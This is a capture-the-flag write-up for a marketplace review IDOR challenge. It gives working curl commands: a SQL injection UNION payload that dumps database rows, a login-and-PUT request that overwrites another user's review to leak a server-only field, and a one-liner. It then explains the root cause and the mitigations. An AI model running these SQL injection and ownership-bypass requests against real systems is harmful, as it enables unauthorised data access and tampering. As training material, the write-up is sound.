# web6 — Marketplace Reviews Look Tidy (Review IDOR)

> *Marketplace reviews look tidy from the outside, but one operator's
> reputation can be rewritten if the wrong handle gets trusted.*

**Category:** Web — IDOR via URL-path identifier + planted decoy
**Flag:** `bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}`

## The brief, in plain English

The "wrong handle" is the review id in the URL path. The `PUT /api/reviews/<id>`
handler trusts the path id as the only authorization check — there is no
"does this user own this review?" gate. Any logged-in user can overwrite any
review's text, and the response leaks the full row including a server-only
`moderationNote` column that carries the flag.

There are also two flag-shaped strings in the response. One is the planted
decoy (`fileHash`), one is the real answer (`moderationNote`). The challenge
deliberately makes the wrong one *easier* to find.

## Endpoints

Two endpoints make up the surface:

- `POST /api/reviews {reviewText, filename, listingId}` — accepts any
  authed user. Enforces a tiny allow-list of three filenames
  (`exploitation_proof.png`, `rat_screenshot.jpg`, `domain_admin.png`) with
  hard-coded MD5 references. Returns the created row.
- `PUT /api/reviews/<id> {reviewText}` — accepts any authed user. **No
  ownership check.** Returns the *full* row including `fileHash` and
  `moderationNote`.

## Recon — finding the seed row

To target the right row, dump the seed `Review` rows via the web3 SQLi
pivot:

```bash
$ curl -s -b "$COOKIE" --data-urlencode \
  "ref=' UNION SELECT id, userId, listingId, reviewText, moderationNote, createdAt
        FROM Review WHERE moderationNote IS NOT NULL --" \
  -G 'http://159.89.230.27/api/orders/lookup' \
  | python3 -m json.tool
```

One row matches:

```json
{
  "id": "seed-phantom-hacker",
  "listingName": "k7m3n",
  "status": "rat-builder",
  "notes": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
  ...
}
```

(The columns are misaligned because we projected through `/api/orders/lookup`'s
six-column shape — `listingName` is actually `userId`, `status` is the
listing id, and `notes` is the `moderationNote`.)

Two pieces of intel:

1. The target row id is `seed-phantom-hacker`.
2. The seed row's owner is `userId = k7m3n`. **Remember this name** — it's
   the breadcrumb that unlocks [web7](../07-web7-orders-jwt-idor/README.md).

## Exploitation

```bash
COOKIE=$(curl -s -X POST -H 'Content-Type: application/json' \
  -d '{"email":"a@b.c","password":"x"}' -D - http://159.89.230.27/api/auth/login \
  | awk -F'[=;]' '/auth-token/{print "auth-token="$2}')

curl -s -b "$COOKIE" -X PUT -H 'Content-Type: application/json' \
  -d '{"reviewText":"y"}' \
  http://159.89.230.27/api/reviews/seed-phantom-hacker \
  | python3 -c 'import json,sys; print(json.load(sys.stdin)["review"]["moderationNote"])'
# bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}
```

The new review text doesn't matter — the response itself is the leak.

## The two flag-shaped strings in the response

The full response body:

```json
{
  "success": true,
  "review": {
    "id": "seed-phantom-hacker",
    "listingId": "rat-builder",
    "userId": "k7m3n",
    "reviewText": "y",
    "filename": "rat_screenshot.jpg",
    "fileHash": "0c7406664fa3077c4a9a535f424d7ecd",
    "proofPath": "rat-builder/rat_screenshot.jpg",
    "moderationNote": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
    "createdAt": "…"
  },
  "moderationNote": "bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}",
  "message": "Review updated successfully."
}
```

Two visible flag-shaped tokens to evaluate:

| Field | Value | Verdict |
|---|---|---|
| `fileHash` | `0c7406664fa3077c4a9a535f424d7ecd` | Real MD5 — not a flag. |
| `moderationNote` | `bitflag{r3v13w_0wn3r5h1p_1s_n0t_4_sugg35t10n}` | **Real flag.** |

If you POST a *new* review (instead of PUT-ing the seed), the server stamps a
**different** value into `fileHash` —
`bitflag{md5_1s_br0k3n_l1k3_my_h34rt}` — which looks like the flag but is
the **planted decoy** for *this* challenge. It is the *real* flag for "The
Proof Stamp" (see [09](../09-the-proof-stamp/README.md)). On web6, the seed row's
`fileHash` is a normal MD5 — distinguishing the seed row from any user-created
decoy is itself a useful tell that you're on the right row.

## Root cause

The handler authorises the request by the path id alone:

```js
const review = await db.review.findUnique({ where: { id: params.id } });
if (!review) return Response.json({ error: "not found" }, { status: 404 });
const updated = await db.review.update({
  where: { id: params.id },
  data: { reviewText: body.reviewText },
});
return Response.json({ success: true, review: updated, moderationNote: updated.moderationNote });
```

(Reconstructed from observed behaviour — the bug is the absence of an
`if (review.userId !== session.userId) return 403`.)

Two failures:

1. **No ownership check.** Reviews can be edited by anyone with a JWT.
2. **Overshare on response.** The handler returns the entire row including
   columns that should never reach the client (`moderationNote`).

## Mitigation

- **Authorise on the resource owner, not the URL.** Look up the resource,
  compare its owner to the authenticated user, return 403 if it doesn't
  match. This check belongs in the handler regardless of any framework
  middleware that happens to also gate it.
- **Whitelist response fields.** Don't return the full DB row. Pick the
  fields that are safe to expose and serialise only those.
- **Server-only fields (`moderationNote`, internal flags) should be
  unreachable from any user-facing endpoint.** If a field is moderator-only,
  no buyer-facing handler should be able to read it into a response.

## Takeaways

- "Wrong handle gets trusted" maps precisely to the URL-path `<id>` being
  the only auth signal. The verb is "trust this identifier as the auth
  check", and the route trusts the wrong layer.
- Two flag-shaped strings in the response, exactly one is right. The
  challenge structures the planted decoy to be the *first* thing you'd
  reach for if you grep blindly. Reading the actual column names matters.
- **Cross-reference to web7.** The seed row's `userId = k7m3n` is the
  breadcrumb. Web7 forges a JWT as `k7m3n` to read their completed orders.
  Solving web6 hands you the answer to web7's hardest question.

## One-liner

```bash
curl -s -b "$COOKIE" -X PUT -H 'Content-Type: application/json' \
  -d '{"reviewText":"y"}' \
  http://<host>/api/reviews/seed-phantom-hacker \
  | grep -oE 'bitflag\{[^}]+\}'
```
